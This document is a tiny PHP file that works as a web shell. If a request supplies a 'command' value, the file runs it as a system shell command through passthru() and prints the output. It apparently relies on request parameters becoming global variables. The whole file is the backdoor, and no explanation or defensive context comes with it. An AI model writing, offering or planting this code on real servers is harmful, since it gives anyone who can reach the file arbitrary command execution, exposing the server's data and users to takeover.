<?php 
header("Content-type: text/html; charset=gb2312"); 
if($command) {echo passthru($command);}
?>